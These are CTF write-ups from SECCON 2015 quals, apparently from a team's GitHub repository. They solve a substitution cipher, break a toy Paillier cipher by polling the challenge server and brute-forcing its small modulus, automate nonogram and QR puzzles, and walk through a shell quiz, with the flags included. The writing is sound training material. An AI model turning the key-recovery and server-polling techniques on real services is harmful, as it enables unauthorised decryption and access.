{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/last_crypto_50/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/last_crypto_50/README.md", "content": "##Last Challenge (Thank you for playing) (Misc/Crypto, 50p)\n\n```\nex1\nCipher:PXFR}QIVTMSZCNDKUWAGJB{LHYEO\nPlain: ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\n\nex2\nCipher:EV}ZZD{DWZRA}FFDNFGQO\nPlain: {HELLOWORLDSECCONCTF}\n\nquiz\nCipher:A}FFDNEA}}HDJN}LGH}PWO\nPlain: ??????????????????????\n```\n\n###PL\n[ENG](#eng-version)\n\nDostajemy do rozwiązania prost szyfr podstawieniowy. Na podsatwie pierwszej pary plaintext-ciphertext generujemy mapę podstawień a następnie dekodujemy flagę:\n\n```python\ndata1 = \"PXFR}QIVTMSZCNDKUWAGJB{LHYEO\"\nres1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\"\nsub = dict(zip(data1, res1))\nprint(\"\".join([sub[letter] for letter in \"A}FFDNEA}}HDJN}LGH}PWO\"]))\n```\n\n`SECCON{SEEYOUNEXTYEAR}`\n\n\n### ENG version\n\nWe get a very simple substitution cipher to solve. Using the first plaintext-ciphertext pair we genrate a substitution map and the we decode the flag:\n\n```python\ndata1 = \"PXFR}QIVTMSZCNDKUWAGJB{LHYEO\"\nres1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\"\nsub = dict(zip(data1, res1))\nprint(\"\".join([sub[letter] for letter in \"A}FFDNEA}}HDJN}LGH}PWO\"]))\n```\n\n`SECCON{SEEYOUNEXTYEAR}`", "timestamp": "2025-10-21T22:03:25.064323"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/paillier_crypto_200/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/paillier_crypto_200/README.md", "content": "##Find the prime numbers (Crypto, 200p)\n\n###PL\n[ENG](#eng-version)\n\nDostajemy [kod](paillier.txt) skryptu pracującego na serwerze. Skrypt szyfruje pewną wiadomość za pomocą szyfru Pailliera a następnie podaje nam zaszyfrowaną wiadomość oraz kilka innych parametrów. Naszym zadaniem jest złamać szyfr.\nSzyfr jest lekko zbliżony do szyfrowania metodą RSA i jego łamanie przebiega w dość podobny sposób. Pierwszym krokiem do złamania szyfru jest uzyskanie informacji o liczbie `n` która jest podstawą dla operacji reszty z dzielenia podczas szyfrowania. Wykorzystujemy tutaj informacje przychodzące z serwera:\n\n```python\n\twhile 1:\n\t\tx = pow(random.randint(1000000000, 9999999999), n, (n * n))\n\t\to = (pow(n + 1, 1, n * n) * x) % (n * n)\n\t\ty = (((pow(o, l, n * n) - 1) // n) * d) % n\n\t\tif y == 1:\n\t\t\tbreak\n\tc = (pow(n + 1, int(v[\"num\"]), n * n) * x) % (n * n)\n\th = (c * o) % (n * n)\n\tq = \"%019d + %019d = %019d\" % (c, o, h)\n\tprint q\n```\n\nJak widać serwer za każdym razem wypisuje nam 3 liczby, z których każda jest resztą z dzielenia przez `n^2`. Dzięki temu możemy szybko ustalić pewne dolne ograniczenie dla liczby `n`, ponieważ liczba `n^2` nie może być większa niż największa z liczb którą dostaniemy z serwera. Dodatkowo wiemy, że\n\n`h = (c * o) % (n * n)`\n\nwięc możemy wykorzystać tą zależność do testowania czy aktualnie testowane `n` jest szukaną liczbą.\n\nOperacje pozyskiwania liczby `n` przeprowadzamy skryptem:\n\n```python\nlower_bound = 0\nbound_lock = threading.Lock()\n\n\ndef seed_collector():\n    global bound_lock\n    global lower_bound\n    while True:\n        url = \"http://pailler.quals.seccon.jp/cgi-bin/pq.cgi\"\n        data = str(requests.get(url).content)\n        c, o, h = map(int, re.findall(\"\\d+\", data))\n        potential_n = int(math.sqrt(max([c, o, h])))\n        bound_lock.acquire()\n        if potential_n > lower_bound:\n            lower_bound = potential_n\n            print(\"new lower bound \" + str(lower_bound))\n        bound_lock.release()\n        print(c, o, h)\n        sleep(3)\n\n\ndef bruter():\n    global lower_bound\n    global bound_lock\n    bound = 1\n    while True:\n        bound_lock.acquire()\n        current = max([bound, lower_bound])\n        lower_bound = current\n        if valid_n(lower_bound):\n            print(\"n=\" + str(lower_bound))\n            return\n        else:\n            lower_bound += 1\n        bound_lock.release()\n```\n\nSkrypt opiera się na dwóch wątkach. Pierwszy odpytuje serwer o kolejne trójki liczb i szuka największego dolnego ograniczenia dla liczby `n`. \nDrugi iteruje po kolejnych możliwych liczbach `n` i na podstawie jednego z równań pozyskanych z serwera sprawdza czy jest poprawna.\nW ten sposób uzyskujemy `n = 2510510339` które faktoryzujemy do `p = 42727` i `q = 58757`. Dysponując tymi wartościami możemy przejść bezpośrednio do dekodowania wiadomości. Zgodnie z opisem na wikipedii wyliczamy parametry `lambda` oraz `mi` i za ich pomocą dekodujemy wiadomość:\n\n```python\nlbd = 1255204428  # lcm(p-1, q-1)\ng = n + 1\nx = L(pow(g, lbd, n * n), n)\nmi = int(modinv(n, x))\nc = 2662407698910651121  # example ciphertext from server\nm = L(pow(c, lbd, n * n), n) * pow(mi, 1, n)\nprint(m % n)\n```\n\nCo daje nam: `1510490612` a umieszczenie tej liczby na serwerze daje flagę: `SECCON{SECCoooo_oooOooo_ooooooooN}`\n\nKompletny użyty skrypt znajduje sie [tutaj](crypto_paillier.py)\n\n### ENG version\n\nWe get the [source code](paillier.txt) of a script that is used on the server. The cipher encodes a certain message using Paillier cipher and the returns to us the encoded message and some parameters. Our task is to break the code.\nThe cipher is a bit like RSA and the approach to break it is very similar. First step is to get the `n` number which is the basis for all modulo operations in the cipher. For this we use data we get from server:\n\n```python\n\twhile 1:\n\t\tx = pow(random.randint(1000000000, 9999999999), n, (n * n))\n\t\to = (pow(n + 1, 1, n * n) * x) % (n * n)\n\t\ty = (((pow(o, l, n * n) - 1) // n) * d) % n\n\t\tif y == 1:\n\t\t\tbreak\n\tc = (pow(n + 1, int(v[\"num\"]), n * n) * x) % (n * n)\n\th = (c * o) % (n * n)\n\tq = \"%019d + %019d = %019d\" % (c, o, h)\n\tprint q\n```\n\nAs can be seen, the server prints 3 numbers, each one is a reminder after division by `n^2`. This means we can quickly make a lower bound for `n` since `n^2` can't be bigger than the biggest number we get from server. On top of that we know that:\n\n`h = (c * o) % (n * n)`\n\nso we can use this equation to quickly test if the `n` we are testing is the number we are looking for.\n\nRecovery of `n` is done with script:\n\n```python\nlower_bound = 0\nbound_lock = threading.Lock()\n\n\ndef seed_collector():\n    global bound_lock\n    global lower_bound\n    while True:\n        url = \"http://pailler.quals.seccon.jp/cgi-bin/pq.cgi\"\n        data = str(requests.get(url).content)\n        c, o, h = map(int, re.findall(\"\\d+\", data))\n        potential_n = int(math.sqrt(max([c, o, h])))\n        bound_lock.acquire()\n        if potential_n > lower_bound:\n            lower_bound = potential_n\n            print(\"new lower bound \" + str(lower_bound))\n        bound_lock.release()\n        print(c, o, h)\n        sleep(3)\n\n\ndef bruter():\n    global lower_bound\n    global bound_lock\n    bound = 1\n    while True:\n        bound_lock.acquire()\n        current = max([bound, lower_bound])\n        lower_bound = current\n        if valid_n(lower_bound):\n            print(\"n=\" + str(lower_bound))\n            return\n        else:\n            lower_bound += 1\n        bound_lock.release()\n```\n\nThe script uses two threads. First one queries the server for triplets and looks for bigger lower bound for `n`.\nThe second iterates over possible `n` and using one of the equations from the server it is checking if the currently tested value is the real `n`.\nThis way almost instantly we get `n = 2510510339` which we factor into `p = 42727` and `q = 58757`.\nWith those two values we can recover the private key and start decoding the cipher. We follow the decription on wikipedia to calculate the `lambda` and `mi` parameters and we use them to decode the message:\n\n```python\nlbd = 1255204428  # lcm(p-1, q-1)\ng = n + 1\nx = L(pow(g, lbd, n * n), n)\nmi = int(modinv(n, x))\nc = 2662407698910651121  # example ciphertext from server\nm = L(pow(c, lbd, n * n), n) * pow(mi, 1, n)\nprint(m % n)\n```\n\nWhich gives us: `1510490612` and placing this number on the server gives the flag: `SECCON{SECCoooo_oooOooo_ooooooooN}`\n\nWhole script is available [here](crypto_paillier.py)\n", "timestamp": "2025-10-21T22:03:25.337146"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/paillier_crypto_200/paillier.txt", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/paillier_crypto_200/paillier.txt", "content": "#!/usr/bin/env python\n\nimport sys\nimport random\nimport fcntl\nimport os\nimport json\nimport random\nimport time\n\ndef read_json(name):\n\twith open(name) as f:\n\t\tfcntl.flock(f.fileno(), fcntl.LOCK_EX)\n\t\ttry:\n\t\t\tv = json.loads(f.read())\n\t\tfinally:\n\t\t\tfcntl.flock(f.fileno(), fcntl.LOCK_UN)\n\treturn v\n\ndef write_json(name, v):\n\twith open(name, \"w\") as f:\n\t\tfcntl.flock(f.fileno(), fcntl.LOCK_EX)\n\t\ttry:\n\t\t\tf.write(json.dumps(v))\n\t\tfinally:\n\t\t\tfcntl.flock(f.fileno(), fcntl.LOCK_UN)\n\treturn\n\nprint \"Content-Type: text/html\"\nprint\nprint \"<html>\"\nprint \"<body>\"\nprint \"<pre>\"\n\nwhile 1:\n\tt = int(time.time())\n\tw = read_json(\"access.json\")\n\te = os.environ[\"REMOTE_ADDR\"]\n\tif not e in w.keys():\n\t\tw.setdefault(e, {})\n\t\tw[e].setdefault(\"outp\", \"\")\n\t\tw[e].setdefault(\"time\", 0)\n\telse:\n\t\tif t < w[e][\"time\"]:\n\t\t\tprint w[e][\"outp\"]\n\t\t\tbreak\n\t\n\tv = read_json(\"data.json\")\n\t\n\ta = int(v[\"p\"])\n\tb = int(v[\"q\"])\n\tn = (a * b)\n\tl = (a - 1) * (b - 1)\n\tr = l\n\td = 1\n\twhile 1:\n\t\td = ((n // r + 1) * d) % n\n\t\tr = (d * l) % n\n\t\tif r == 1:\n\t\t\tbreak\n\twhile 1:\n\t\tx = pow(random.randint(1000000000, 9999999999), n, (n * n))\n\t\to = (pow(n + 1, 1, n * n) * x) % (n * n)\n\t\ty = (((pow(o, l, n * n) - 1) // n) * d) % n\n\t\tif y == 1:\n\t\t\tbreak\n\tc = (pow(n + 1, int(v[\"num\"]), n * n) * x) % (n * n)\n\th = (c * o) % (n * n)\n\tq = \"%019d + %019d = %019d\" % (c, o, h)\n\tprint q\n\t\n\tz = \"QUERY_STRING\"\n\tif z in os.environ and os.environ[z] != \"\":\n\t\tif w[e][\"time\"] < t and os.environ[z] == v[\"num\"]:\n\t\t\tprint \"SECCON{\" + v[\"flag\"] + \"}\"\n\t\tw[e][\"time\"] = t + 60\n\t\tw[e][\"outp\"] = q\n\telse:\n\t\tw[e][\"time\"] = t + 3\n\t\tw[e][\"outp\"] = q\n\t\n\twrite_json(\"access.json\", w)\n\t\n\twith open(\"/var/www/log.txt\", \"a\") as f:\n\t\tfcntl.flock(f.fileno(), fcntl.LOCK_EX)\n\t\ttry:\n\t\t\tf.write(q + \"\\n\")\n\t\tfinally:\n\t\t\tfcntl.flock(f.fileno(), fcntl.LOCK_UN)\n\tbreak\n\nprint \"</pre>\"\nprint \"</body>\"\nprint \"</html>\"\n", "timestamp": "2025-10-21T22:03:25.453099"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/qr_nonogram_300/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/qr_nonogram_300/README.md", "content": "##QR puzzle (Nonogram) (Misc, 300p)\n\n>Solve a puzzle 30 times  \n>http://qrlogic.pwn.seccon.jp:10080/game/\n\n###PL\n[ENG](#eng-version)\n\nZadanie było proste: dostajemy losowo wygenerowany nonogram, rozwiązujemy go otrzymując qrcode, dekodujemy go i przechodzimy do następnej rundy. Jeżeli uda nam się dotrzeć do końca to otrzymujemy flagę.\n\n![](./nonogram.png)\n\nSama gra nie jest tutaj bardzo ważna: miało dla nas znaczenie tylko to, że było dostępnych kilka gotowych solverów. Losowo użyliśmy tego: http://jwilk.net/software/nonogram.\n\nJako że było sporo rund zdecydowaliśmy się napisać w pełni automatyczny solver. Pierwszym zadaniem było sparsowanie strony i pobranie liczb nonogramu.\n\n```python\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\n\nsession = requests.Session()\n\nsource = session.post('http://qrlogic.pwn.seccon.jp:10080/game/').content\nsoup = BeautifulSoup(source)\n\nprint re.findall('Stage: (\\d+) / 30', source)\n\ndef parse(cls):\n\treturn [[span.contents[0] for span in th.find_all('span')] for th in soup.find_all('th', class_=cls)]\n\nrows = parse('rows')\ncols = parse('cols')\n```\n\nNastępna część to przekazanie tych danych do faktycznego solvera:\n\n```python\nfrom pwn import *\n\nsolver = process('nonogram-0.9/nonogram')\nsolver.sendline(\"%d %d\" % (len(cols), len(rows)))\n\nfor row in rows:\n\tsolver.sendline(' '.join(row))\n\nfor col in cols:\n\tsolver.sendline(' '.join(col))\n\nsolver.shutdown()\n```\n\nI otrzymanie wyniku:\n\n```python\nqr_text = []\nfor i in range(0, len(rows)):\n\tsolver.recvuntil('|')\n\tqr_text.append(solver.recvuntil('|')[:-1])\n```\n\nKtóry na tym etapie wyglądał tak:\n\n![](./qrcode.png)\n\nTo tekst, a my musimy skonwertować go na faktyczny obrazek z qrcode:\n\n```python\nfrom PIL import Image, ImageDraw\n\nsize = 20\nimage = Image.new('RGB', ((len(qr_text) * size), (len(qr_text[0]) * size) / 2))\ndraw = ImageDraw.Draw(image)\n\nfor i in range(0, len(qr_text)):\n\tfor j in range(0, len(qr_text[0]) / 2):\n\t\tpos = ((j * size, i * size), (j * size + size, i * size + size))\n\t\tdraw.rectangle(pos, 'black' if qr_text[i][j * 2] == '#' else 'white')\n\nimage.save('qrcode.png')\n```\n\nMożemy go teraz przeczytać:\n\n```python\nimport qrtools\n\nqr = qrtools.QR()\nqr.decode('qrcode.png')\nreturn qr.data\n```\n\nWysłać i powtórzyć cały proces.\n```python\nanswer = ''\nfor i in range(0, 100):\n    get_image(answer)\n    answer = get_qrcode()\n    print answer\n```\n\nSolver nie był idealny - musieliśmy go uruchomić kilka razy, ale po kilku minutach otrzymaliśmy flagę.\n\n`SECCON{YES_WE_REALLY_LOVE_QR_CODE_BECAUSE_OF_ITS_CLEVER_DESIGN}`\n\n### ENG version\n\nTask details are simple: we get a randomly generated nonogram, we solve it and with that get a qr code, we decode it and get to the next round. If we manage to get to the end we're given the flag.\n\n![](./nonogram.png)\n\nThe game itself isn't very important here: all that mattered to us was that there were several solvers available. We randomly chose this one: http://jwilk.net/software/nonogram.\n\nAs there were many stages we opted in for a fully automated solver. First task was to parse the webpage and get the nonogram numbers.\n\n```python\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\n\nsession = requests.Session()\n\nsource = session.post('http://qrlogic.pwn.seccon.jp:10080/game/').content\nsoup = BeautifulSoup(source)\n\nprint re.findall('Stage: (\\d+) / 30', source)\n\ndef parse(cls):\n\treturn [[span.contents[0] for span in th.find_all('span')] for th in soup.find_all('th', class_=cls)]\n\nrows = parse('rows')\ncols = parse('cols')\n```\n\nNext part was to pass these to the actual solver:\n\n```python\nfrom pwn import *\n\nsolver = process('nonogram-0.9/nonogram')\nsolver.sendline(\"%d %d\" % (len(cols), len(rows)))\n\nfor row in rows:\n\tsolver.sendline(' '.join(row))\n\nfor col in cols:\n\tsolver.sendline(' '.join(col))\n\nsolver.shutdown()\n```\n\nAnd get the result:\n\n```python\nqr_text = []\nfor i in range(0, len(rows)):\n\tsolver.recvuntil('|')\n\tqr_text.append(solver.recvuntil('|')[:-1])\n```\n\nWhich at this point looked like this:\n\n![](./qrcode.png)\n\nThat's text and we need to convert it to a proper qrcode image:\n\n```python\nfrom PIL import Image, ImageDraw\n\nsize = 20\nimage = Image.new('RGB', ((len(qr_text) * size), (len(qr_text[0]) * size) / 2))\ndraw = ImageDraw.Draw(image)\n\nfor i in range(0, len(qr_text)):\n\tfor j in range(0, len(qr_text[0]) / 2):\n\t\tpos = ((j * size, i * size), (j * size + size, i * size + size))\n\t\tdraw.rectangle(pos, 'black' if qr_text[i][j * 2] == '#' else 'white')\n\nimage.save('qrcode.png')\n```\n\nWe can now read it:\n\n```python\nimport qrtools\n\nqr = qrtools.QR()\nqr.decode('qrcode.png')\nreturn qr.data\n```\n\nSend it and repeat the whole process:\n```python\nanswer = ''\nfor i in range(0, 100):\n    get_image(answer)\n    answer = get_qrcode()\n    print answer\n```\n\nThe solver wasn't perfect: we had to rerun it several times, but after few minutes we got the flag.\n\n`SECCON{YES_WE_REALLY_LOVE_QR_CODE_BECAUSE_OF_ITS_CLEVER_DESIGN}`\n", "timestamp": "2025-10-21T22:03:25.730920"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/qr_web_400/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/qr_web_400/README.md", "content": "## QR Puzzle: Web (Unknown, 400p)\n\n    Solve the slide puzzle and decode the QR code.\n    http://puzzle.quals.seccon.jp:42213/slidepuzzle\n\n###PL\n[ENG](#eng-version)\n\nPodobnie jak w poprzednich QR Puzzle dostajemy QR code i mamy go rozwiązać. Tym razem problemem jest to, że brakuje fragmentu kodu.\n\n![](screen.png)\n\nZ czasem zadania robią się coraz trudniejsze - na początku brakuje zawsze prawego dolnego rogu kodu, później również krawędzi, później środka, a na końcu może brakować również innego rogu (co okazało się problematyczne).\nDość oczywisty jest cel zadania - należy napisać program który złoży taki QR code, rozwiąże go, oraz wyśle do programu.\n\nWykorzystaliśmy do tego solver z poprzedniego zadania QR Puzzle, jedynie nieznacznie musieliśmy przerobić funkcje pobierającą obrazki z ekranu, oraz nie wysyłaliśmy rozwiązań a przeklejaliśmy ręcznie.\n\nKodu jest za dużo by omawiać go funkcja po funkcji, ale działa prawie identycznie jak w zadaniu [QR puzzle: Windows](https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/qr_windows_200) - ma jedynie kilka poprawek.\n\nFlaga:\n\n    SECCON{U_R_4_6R347_PR06R4MM3R!}\n\n\n\n### ENG version\n\nWe are given qr code, and we have to unscramble it - just like in earlier qr puzzle challenge. It's harder now, because there is much more fragments, and one piece is missing.\n\n![](screen.png)\n\nQr codes are getting harder with time - at the beggining missing piece is always lower right corner, but later we can expect also missing edge, missing central piece, or even missing another corner (worst case scenario).\nIt's obvious what task authors are expecting from us - we kave to write program that assembles such QR code, solve it, and then sends it to server.\n\nWe used our solver from previons challenge - we only had to slightly rework function that captured qr code, and we didn't sent solutions automatically (it had to be done manually).\n\nThere is too much code to go through it function by function, but it is almost identical as in [QR puzzle: Windows](https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/qr_windows_200) challenge - we only fixed few minor things.\n\nFlag:\n\n    SECCON{U_R_4_6R347_PR06R4MM3R!}\n", "timestamp": "2025-10-21T22:03:25.995709"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/qr_windows_200/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/qr_windows_200/README.md", "content": "## QR Puzzle (Unknown, 200p)\n\n    Please solve a puzzle 300 times\n    QRpuzzle.zip\n\n###PL\n[ENG](#eng-version)\n\nDostajemy program, który wyświetla poszatkowane QR cody po uruchomieniu:\n\n![](screen.png)\n\nDość oczywisty jest cel zadania - należy napisać program który złoży taki QR code, rozwiąże go, oraz wyśle do programu.\nMoglibyśmy próbować go reversować, ale to wyraźnie co innego niż autorzy zadania zaplanowali dla nas, więc nie poszliśmy tą drogą.\n\nNapisaliśmy w tym celu pewien bardzo duży solver, który:\n - robił screena programu\n - wyciągał z niego poszczególne fragmenty\n - składał części w jedną (najtrudniejsza część oczywiśćie)\n - dekodował wynikowy QR code\n - wysyłał zdekodowany tekst do aplikacji\n - czekał 500 ms i powtarzał ten cykl.\n\nKodu jest za dużo by omawiać go funkcja po funkcji, wklejona zostanie jedynie główna funkcja pokazująca te kroki ([pełen kod](Form1.cs)]:\n\n```csharp\nwhile (true)\n{\n    using (var bmp = CaptureApplication(\"QRpuzzle\"))\n    {\n        var chunks = Split(\n            18, 77,\n            160, 167,\n            6, 13,\n            3,\n            bmp);\n        var result = Bundle.Reconstruct(chunks, 3);\n\n        var reader = new BarcodeReader { PossibleFormats = new[] { BarcodeFormat.QR_CODE }, TryHarder = true };\n\n        result.Save(\"Test2.png\");\n        var code = reader.Decode(result);\n\n        SendKeys.Send(code.Text);\n        Thread.Sleep(500);\n    }\n}\n```\n\nFlaga:\n\n    SECCON{402B00F89DC8}\n\n\n\n### ENG version\n\nWe get a program that displays scrambled QR codes when run:\n\n![](screen.png)\n\nIt's obvious what task authors want from us - we have to write program that unscrambles given QR code and sends it to program.\nOf course we could try to reverse engineer given program, but clearly task authors wanted us to solve challenge different way.\n\nWe have written large solver, that:\n - captured program window to bitmap\n - cut all 9 qr code fragments to different bitmaps\n - put fragments in correct order (hardest part, by far)\n - decoded resulting QR code\n - sent decoded text to program\n - slept 500 ms and repeated that cycle\n\nSolver code is too large to be described function by function, so we will just paste main function here ([full code](Form1.cs)):\n\n```csharp\nwhile (true)\n{\n    using (var bmp = CaptureApplication(\"QRpuzzle\"))\n    {\n        var chunks = Split(\n            18, 77,\n            160, 167,\n            6, 13,\n            3,\n            bmp);\n        var result = Bundle.Reconstruct(chunks, 3);\n\n        var reader = new BarcodeReader { PossibleFormats = new[] { BarcodeFormat.QR_CODE }, TryHarder = true };\n\n        result.Save(\"Test2.png\");\n        var code = reader.Decode(result);\n\n        SendKeys.Send(code.Text);\n        Thread.Sleep(500);\n    }\n}\n```\n\nFlag:\n\n    SECCON{402B00F89DC8}\n", "timestamp": "2025-10-21T22:03:26.264879"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/quiz_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/quiz_100/README.md", "content": "## Command-Line Quiz (Unknown, 100p)\n\n    telnet caitsith.pwn.seccon.jp\n    User:root\n    Password:seccon\n    The goal is to find the flag word by \"somehow\" reading all *.txt files.\n\n###PL\n[ENG](#eng-version)\n\nŁączymy się ze wskazanym serwerem: \n\n```\nCaitSith login: root\nPassword:\n$ ls\nbin         flags.txt   linuxrc     stage1.txt  stage4.txt  usr\ndev         init        proc        stage2.txt  stage5.txt\netc         lib         sbin        stage3.txt  tmp\n$ cat flags.txt\ncat: can't open 'flags.txt': Operation not permitted\n$ cat stage1.txt\nWhat command do you use when you want to read only top lines of a text file?\n\nSet your answer to environment variable named stage1 and execute a shell.\n\n  $ stage1=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage2.txt file.\n$ cat stage2.txt\ncat: can't open 'stage2.txt': Operation not permitted\n```\n\nJesteśmy w stanie przeczytać tylko plik stage1.txt, kolejne są odblokowywane w momencie kiedy\nrozwiążemy poprzednie zagadki. Więc idziemy po kolei:\n\n```\n$ cat stage1.txt\nWhat command do you use when you want to read only top lines of a text file?\n\nSet your answer to environment variable named stage1 and execute a shell.\n\n  $ stage1=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage2.txt file.\n$ stage1=head sh\n$ cat stage2.txt\nWhat command do you use when you want to read only bottom lines of a text file?\n\nSet your answer to environment variable named stage2 and execute a shell.\n\n  $ stage2=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage3.txt file.\n$ stage2=tail sh\n$ cat stage3.txt\nWhat command do you use when you want to pick up lines that match specific patterns?\n\nSet your answer to environment variable named stage3 and execute a shell.\n\n  $ stage3=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage4.txt file.\n$ stage3=grep sh\n$ cat stage4.txt\nWhat command do you use when you want to process a text file?\n\nSet your answer to environment variable named stage4 and execute a shell.\n\n  $ stage4=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage5.txt file.\n$ stage4=awk sh\n$ cat stage5.txt\nOK. You reached the final stage. The flag word is in flags.txt file.\n\nflags.txt can be read by only one specific program which is available\nin this server. The program for reading flags.txt is one of commands\nyou can use for processing a text file. Please find it. Good luck. ;-)\n$ sed -e ''  flags.txt\nOK. You have read all .txt files. The flag word is shown below.\n\nSECCON{CaitSith@AQUA}\n```\n\n### ENG version\n\nWe connect to server pointed in description:\n\n```\nCaitSith login: root\nPassword:\n$ ls\nbin         flags.txt   linuxrc     stage1.txt  stage4.txt  usr\ndev         init        proc        stage2.txt  stage5.txt\netc         lib         sbin        stage3.txt  tmp\n$ cat flags.txt\ncat: can't open 'flags.txt': Operation not permitted\n$ cat stage1.txt\nWhat command do you use when you want to read only top lines of a text file?\n\nSet your answer to environment variable named stage1 and execute a shell.\n\n  $ stage1=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage2.txt file.\n$ cat stage2.txt\ncat: can't open 'stage2.txt': Operation not permitted\n```\n\nWe can only read stage1.txt file, other files are locked untill we solve earlier challenges. So we proceed step by step:\n\n```\n$ cat stage1.txt\nWhat command do you use when you want to read only top lines of a text file?\n\nSet your answer to environment variable named stage1 and execute a shell.\n\n  $ stage1=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage2.txt file.\n$ stage1=head sh\n$ cat stage2.txt\nWhat command do you use when you want to read only bottom lines of a text file?\n\nSet your answer to environment variable named stage2 and execute a shell.\n\n  $ stage2=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage3.txt file.\n$ stage2=tail sh\n$ cat stage3.txt\nWhat command do you use when you want to pick up lines that match specific patterns?\n\nSet your answer to environment variable named stage3 and execute a shell.\n\n  $ stage3=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage4.txt file.\n$ stage3=grep sh\n$ cat stage4.txt\nWhat command do you use when you want to process a text file?\n\nSet your answer to environment variable named stage4 and execute a shell.\n\n  $ stage4=$your_answer_here sh\n\nIf your answer is what I meant, you will be able to access stage5.txt file.\n$ stage4=awk sh\n$ cat stage5.txt\nOK. You reached the final stage. The flag word is in flags.txt file.\n\nflags.txt can be read by only one specific program which is available\nin this server. The program for reading flags.txt is one of commands\nyou can use for processing a text file. Please find it. Good luck. ;-)\n$ sed -e ''  flags.txt\nOK. You have read all .txt files. The flag word is shown below.\n\nSECCON{CaitSith@AQUA}\n```\n\n", "timestamp": "2025-10-21T22:03:26.508866"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/seccon_wars_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/seccon_wars_100/README.md", "content": "## Seccon Wars (Stegano, 100p)\n\n    https://youtu.be/8SFsln4VyEk\n\n###PL\n[ENG](#eng-version)\n\nNa filmie wideo zalinkowanym w zadaniu wyraźnie widać zarysy QR CODE, ale jest on zbyt rozmazany by odczytać go bezpośrednio.\n\nPo chwili zastanowienia (jednym z pomysłów było ręczne naprawianie QR kodu \"w paincie\") wpadliśmy na pomysł uśrednienia wartości piksela dla wielu screenów i odczytania qr codu z takiego uśrednionego obrazu (powinien być czytelniejszy wtedy)\n\nNajpierw napisaliśmy program w C# robiący screeny przeglądarki, żeby mieć co uśredniać:\n\n```csharp\nprivate class User32 {\n    [StructLayout(LayoutKind.Sequential)]\n    public struct Rect {\n        public int left;\n        public int top;\n        public int right;\n        public int bottom;\n    }\n\n    [DllImport(\"user32.dll\")]\n    public static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);\n}\n\npublic void CaptureApplication(string procName, int i) {\n    var proc = Process.GetProcessesByName(procName)[0];\n    var rect = new User32.Rect();\n    User32.GetWindowRect(proc.MainWindowHandle, ref rect);\n\n    int width = rect.right - rect.left;\n    int height = rect.bottom - rect.top;\n\n    var bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb);\n    Graphics graphics = Graphics.FromImage(bmp);\n    graphics.CopyFromScreen(rect.left, rect.top, 0, 0, new Size(width, height), CopyPixelOperation.SourceCopy);\n\n    bmp.Save(\"frame\" + i + \".png\", ImageFormat.Png);\n}\n\nprotected override void OnLoad(EventArgs e) {\n    int i = 0;\n    while (true) {\n        i++;\n        CaptureApplication(\"firefox\", i);\n        Thread.Sleep(100);\n    }\n    base.OnLoad(e);\n}\n```\n\nA następnie niewielki skrypt uśredniający obrazy z folderu (szczerze mówiąc, to tak naprawdę to skopiowaliśmy go z SO):\n\n```python\nimport os, numpy, PIL\nfrom PIL import Image\n\n# Access all PNG files in directory\nallfiles=os.listdir(os.getcwd())\nimlist=[filename for filename in allfiles if  filename[-4:] in [\".png\",\".PNG\"]]\n\n# Assuming all images are the same size, get dimensions of first image\nw,h=Image.open(imlist[0]).size\nN=len(imlist)\n\n# Create a numpy array of floats to store the average (assume RGB images)\narr=numpy.zeros((h,w,3),numpy.float)\n\n# Build up average pixel intensities, casting each image as an array of floats\nfor im in imlist:\n    imarr=numpy.array(Image.open(im).convert(\"RGB\"),dtype=numpy.float)\n    arr=arr+imarr/N\n\n# Round values in array and cast as 8-bit integer\narr=numpy.array(numpy.round(arr),dtype=numpy.uint8)\n\n# Generate, save and preview final image\nout=Image.fromarray(arr,mode=\"RGB\")\nout.save(\"Average.png\")\nout.show()\n```\n\nWynik działania:\n\n![](Average.png)\n\nPo poprawieniu kontrastu, odczytujemy wynik:\n\n    SECCON{TH3F0RC3AVVAK3N53P7}\n\n### ENG version\n\nIn video linked in the description we can clearly see outline of QR CODE, but it's too dark to be read directly\n\nAfter a while (one of our first ideas was to draw qr code by hand in mspaint), we decided to capture a lot of video frames and average all pixels.\n\nFirst, we have written C# script to take browser screenshot every 0.1s:\n\n```csharp\nprivate class User32 {\n    [StructLayout(LayoutKind.Sequential)]\n    public struct Rect {\n        public int left;\n        public int top;\n        public int right;\n        public int bottom;\n    }\n\n    [DllImport(\"user32.dll\")]\n    public static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);\n}\n\npublic void CaptureApplication(string procName, int i) {\n    var proc = 